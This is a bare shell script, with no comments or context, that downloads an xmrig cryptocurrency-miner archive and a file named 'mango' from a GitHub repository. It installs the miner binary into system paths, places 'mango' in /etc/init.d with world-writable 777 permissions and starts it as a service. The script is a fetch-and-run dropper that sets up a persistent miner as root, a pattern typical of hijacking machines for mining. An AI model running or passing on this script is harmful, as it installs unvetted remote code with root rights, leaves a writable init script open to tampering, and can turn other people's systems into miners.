rm -rf xmrig.tar.gz
wget https://raw.githubusercontent.com/BigOrt/bigort/master/xmrig.tar.gz
tar -zxvf xmrig.tar.gz
sudo cp xmrig /usr/loca/bin
sudo cp xmrig /usr/bin
sudo wget https://raw.githubusercontent.com/BigOrt/bigort/master/mango -O /etc/init.d/mango
sudo chmod -R 777 /etc/init.d/mango
sudo chmod +x /etc/init.d/mango
sudo /etc/init.d/mango start
